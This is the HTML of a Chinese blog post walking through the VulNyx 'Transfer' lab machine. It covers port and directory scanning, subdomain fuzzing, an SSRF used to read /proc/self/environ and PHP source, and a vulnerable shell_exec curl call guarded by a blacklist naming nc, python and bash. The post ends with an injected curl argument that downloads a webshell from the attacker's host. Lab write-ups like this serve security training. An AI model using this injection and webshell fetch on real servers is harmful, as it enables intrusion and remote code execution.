@@ -1,0 +1,576 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.0.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" integrity="sha256-yIDrPSXHZdOZhAqiBP7CKzIwMQmRCJ8UeB8Jo17YC4o=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.28/fancybox/fancybox.css" integrity="sha256-6cQIC71/iBIYXFK+0RHAvwmjwWzkWd+r7v/BX3/vZDc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"z9m8r8.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.19.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"fold":{"enable":true,"height":500},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="该文章暂无概述">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VulNyx - Transfer">
+<meta property="og:url" content="https://z9m8r8.github.io/2024/09/12/VulNyx%20-%20Transfer/index.html">
+<meta property="og:site_name" content="Phantom&#39;s Blog">
+<meta property="og:description" content="该文章暂无概述">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-09-11T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-10-10T13:39:44.176Z">
+<meta property="article:author" content="Phantom">
+<meta property="article:tag" content="信息收集">
+<meta property="article:tag" content="提权">
+<meta property="article:tag" content="反弹 shell">
+<meta property="article:tag" content="RCE">
+<meta property="article:tag" content="Fuzzing">
+<meta property="article:tag" content="VulNyx">
+<meta property="article:tag" content="disable_functions">
+<meta property="article:tag" content="DNS">
+<meta property="article:tag" content="SSRF">
+<meta property="article:tag" content="cowsay 提权">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://z9m8r8.github.io/2024/09/12/VulNyx%20-%20Transfer/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://z9m8r8.github.io/2024/09/12/VulNyx%20-%20Transfer/","path":"2024/09/12/VulNyx - Transfer/","title":"VulNyx - Transfer"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>VulNyx - Transfer | Phantom's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Phantom's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">人若无名，便可专心练剑！</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">1. 信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B"><span class="nav-text">1.1. 主机探测</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-text">1.2. 端口扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">1.3. Web 信息收集</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB"><span class="nav-text">2. 渗透攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96-shell"><span class="nav-text">2.1. 获取 shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-text">2.2. 提权</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%8D%E7%9B%98"><span class="nav-text">3. 复盘</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1"><span class="nav-text">3.1. 定时任务</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#tom-%E7%94%A8%E6%88%B7"><span class="nav-text">3.2. tom 用户</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-text">4. 参考</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Phantom"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">Phantom</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">173</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">25</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">156</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/z9m8r8" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;z9m8r8" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.cnblogs.com/z9m8r8" title="博客园 → https:&#x2F;&#x2F;www.cnblogs.com&#x2F;z9m8r8" rel="noopener me" target="_blank"><i class="fa-solid fa-blog fa-fw"></i>博客园</a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://z9m8r8.github.io/2024/09/12/VulNyx%20-%20Transfer/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="Phantom">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Phantom's Blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="VulNyx - Transfer | Phantom's Blog">
+      <meta itemprop="description" content="该文章暂无概述">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          VulNyx - Transfer
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2024-09-12 00:00:00" itemprop="dateCreated datePublished" datetime="2024-09-12T00:00:00+08:00">2024-09-12</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2024-10-10 21:39:44" itemprop="dateModified" datetime="2024-10-10T21:39:44+08:00">2024-10-10</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>2.8k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>10 分钟</span>
+    </span>
+</div>
+
+            <div class="post-description">该文章暂无概述</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><blockquote>
+<p>靶机：<a target="_blank" rel="noopener" href="https://vulnyx.com/">VulNyx: Free Cybersecurity
+Platform | Enthusiasts &amp; Professionals</a></p>
+</blockquote>
+<h2 id="信息收集">1. 信息收集</h2>
+<h3 id="主机探测">1.1. 主机探测</h3>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover  -r 192.168.159.0/24</span><br></pre></td></tr></table></figure>
+<p>靶机：192.168.159.203</p>
+<h3 id="端口扫描">1.2. 端口扫描</h3>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># nmap -sS -sV 192.168.159.203 -p-                          </span></span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-06 09:57 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.159.203</span><br><span class="line">Host is up (0.0014s latency).</span><br><span class="line">Not shown: 65534 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">MAC Address: 00:0C:29:25:79:74 (VMware)</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 16.12 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="web-信息收集">1.3. Web 信息收集</h3>
+<p>80 扫目录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># dirsearch -u &quot;http://192.168.159.203/&quot; -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e txt,php,html -f -t 100 2&gt;&amp;/dev/null</span></span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.3</span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: txt, php, html | HTTP method: GET | Threads: 100 | Wordlist size: 1102725</span><br><span class="line"></span><br><span class="line">Output File: /root/Desktop/reports/http_192.168.159.203/__24-09-06_10-24-13.txt</span><br><span class="line"></span><br><span class="line">Target: http://192.168.159.203/</span><br><span class="line"></span><br><span class="line">[10:24:13] Starting: </span><br><span class="line">[10:24:14] 403 -  280B  - /icons/                                           </span><br><span class="line">[11:07:29] 403 -  280B  - /server-status/                                      </span><br><span class="line">[11:07:29] 403 -  280B  - /server-status                                             </span><br><span class="line">[12:41:32] 301 -  324B  - /viewuploads  -&gt;  http://192.168.159.203/viewuploads/</span><br><span class="line">[12:41:32] 403 -  280B  - /viewuploads/     </span><br><span class="line"></span><br><span class="line">Task Completed </span><br></pre></td></tr></table></figure>
+<p>得 <code>/viewuploads/</code></p>
+<p>进一步扫描没得到任何信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># dirsearch -u &quot;http://192.168.159.203/viewuploads/&quot; -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e php,html -f -t 50 2&gt;&amp;/dev/null</span></span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.3</span><br><span class="line"> (_||| _) (/_(_|| (_| )                                                                        </span><br><span class="line">Extensions: php, html | HTTP method: GET | Threads: 50 | Wordlist size: 882180</span><br><span class="line"></span><br><span class="line">Output File: /root/Desktop/reports/http_192.168.159.203/_viewuploads__24-09-06_13-22-02.txt</span><br><span class="line"></span><br><span class="line">Target: http://192.168.159.203/</span><br><span class="line"></span><br><span class="line">[13:22:02] Starting: viewuploads/                                                      </span><br><span class="line">Task Completed                 </span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># dirsearch -u &quot;http://192.168.159.203/viewuploads/&quot; -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e txt,kdbx,bak,zip,swp,svn,git -f -t 50 2&gt;&amp;/dev/null </span></span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                                           </span><br><span class="line"> (_||| _) (/_(_|| (_| )                                                                        </span><br><span class="line">Extensions: txt, kdbx, bak, zip, swp, svn, git | HTTP method: GET | Threads: 50 | Wordlist size: 1984905</span><br><span class="line"></span><br><span class="line">Output File: /root/Desktop/reports/http_192.168.159.203/_viewuploads__24-09-06_19-12-47.txt</span><br><span class="line"></span><br><span class="line">Target: http://192.168.159.203/</span><br><span class="line"></span><br><span class="line">[19:12:47] Starting: viewuploads/                                                                                         </span><br><span class="line">Task Completed </span><br><span class="line"></span><br><span class="line">dirsearch -u <span class="string">&quot;http://192.168.159.203/&quot;</span> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e bak,zip,swp,svn,gz,kdbx,db,tmp,git,tar.gz -f -t 50 2&gt;&amp;/dev/null</span><br><span class="line"></span><br><span class="line">………………</span><br></pre></td></tr></table></figure>
+<p>扫描 UDP 端口和基于 IPv6 扫端口都未得到有效信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># nmap -sU  192.168.159.203 --top-ports=&quot;1000&quot;</span></span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-06 09:58 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.159.203</span><br><span class="line">Host is up (0.089s latency).</span><br><span class="line">All 1000 scanned ports on 192.168.159.203 are <span class="keyword">in</span> ignored states.</span><br><span class="line">Not shown: 946 closed udp ports (port-unreach), 54 open|filtered udp ports (no-response)</span><br><span class="line">MAC Address: 00:0C:29:25:79:74 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 1089.99 seconds</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># scan6 -i eth0 -L -e -v </span></span><br><span class="line">Link-<span class="built_in">local</span> addresses:</span><br><span class="line">fe80::250:56ff:fec0:2222 @ 00:50:56:e0:3a:a5</span><br><span class="line">fe80::20c:29ff:fe25:7974 @ 00:0c:29:25:79:74</span><br><span class="line"></span><br><span class="line">Global addresses:</span><br><span class="line">fd15:4ba5:5a2b:1008::2222 @ 00:50:56:e0:3a:a5</span><br><span class="line">fd15:4ba5:5a2b:1008:20c:29ff:fe25:7974 @ 00:0c:29:25:79:74</span><br><span class="line">                                                                                                                                                  </span><br><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># nmap -sS -sV -6 fd15:4ba5:5a2b:1008:20c:29ff:fe25:7974 -p-</span></span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-06 10:04 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> fd15:4ba5:5a2b:1008:20c:29ff:fe25:7974</span><br><span class="line">Host is up (0.00038s latency).</span><br><span class="line">Not shown: 65534 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">MAC Address: 00:0C:29:25:79:74 (VMware)</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 20.01 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>看主页响应数据包有个 cookie，解码得到个域名</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202409111616735.png" /></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># echo &quot;MRXW2YLJNY6XGZLDOVZGK5DSMFXHGZTFOIXG46LY&quot; | base32 -d</span></span><br><span class="line">domain=securetransfer.nyx  </span><br></pre></td></tr></table></figure>
+<p>修改 hosts ，securetransfer.nyx <span
+class="math inline">\(\rightarrow\)</span> 192.168.159.203</p>
+<p>Fuzzing 子域</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -c -Z -w SecLists-2024.1/Discovery/DNS/subdomains-top1million-110000.txt  -H <span class="string">&quot;Host: FUZZ.securetransfer.nyx&quot;</span> -u <span class="string">&quot;http://securetransfer.nyx/&quot;</span>  --hw 933 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<p>得 intranet2</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202409111630871.png" /></p>
+<p>修改 hosts，intranet2.securetransfer.nyx <span
+class="math inline">\(\rightarrow\)</span> 192.168.159.203</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202409111628605.png" /></p>
+<p>测试存在 SSRF 漏洞</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202409111628355.png" /></p>
+<h2 id="渗透攻击">2. 渗透攻击</h2>
+<h3 id="获取-shell">2.1. 获取 shell</h3>
+<p>测试了 SSRF 的可利用操作未直接找到 RCE 手段，想读当前存在 SSRF
+漏洞的文件文件看看，但未测试出文件位置，谷歌得可以通过读取该进程的环境变量信息得【<code>/proc/self/environ</code>】，</p>
+<ul>
+<li><code>/proc/self</code>
+是一个特殊的符号链接，指向当前进程的目录。因此，<code>/proc/self/environ</code>
+实际上是当前进程的环境变量。</li>
+<li><code>/proc/self/environ</code>
+并不存在于硬盘上，而是由内核动态生成的虚拟文件。</li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202409111655660.png" /></p>
+<p>进一步读取 <code>file:///var/www/intranet/index.php</code></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202409111658288.png" /></p>
+<p>关键代码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;formurl&#x27;</span>]))&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Requesting Site...&lt;/p&gt;&quot;</span>;</span><br><span class="line">	<span class="variable">$userurl</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;formurl&#x27;</span>];</span><br><span class="line">	<span class="variable">$naughtyurl</span>=<span class="number">0</span>;</span><br><span class="line"><span class="variable">$disallowed</span>=<span class="keyword">array</span>(<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;!&#x27;</span>,<span class="string">&#x27;|&#x27;</span>,<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27;python&#x27;</span>,<span class="string">&#x27;nc&#x27;</span>,<span class="string">&#x27;perl&#x27;</span>,<span class="string">&#x27;bash&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;#&#x27;</span>,<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;[&#x27;</span>,<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">	<span class="keyword">foreach</span>(<span class="variable">$disallowed</span> <span class="keyword">as</span> <span class="variable">$naughty</span>)&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$userurl</span>,<span class="variable">$naughty</span>) !==<span class="literal">false</span>)&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="variable">$naughty</span>.<span class="string">&#x27; Error, Extension Denied: &#x27;</span>;</span><br><span class="line">			<span class="variable">$naughtyurl</span>=<span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$naughtyurl</span>==<span class="number">0</span>)&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;curl &quot;</span>.<span class="variable">$userurl</span>.<span class="string">&quot; 2&gt;&amp;1&quot;</span>); </span><br><span class="line">	&#125;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>分析代码可知服务端是利用 <code>shell_exec</code> 函数执行
+<code>curl</code>
+命令，并将执行响应重定向至输入端，由于服务端又做了一定的过滤限制，直接执行弹
+shell 的命令遇阻【eg：`ls`, $(ls)】，不过依旧可利用 <code>curl</code>
+命令往服务端下载个 webshell ，即：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.174:8000/re_shell.php -o re_shell.php</span><br></pre></td></tr></table></figure>
+<p>re_shell.php</p>
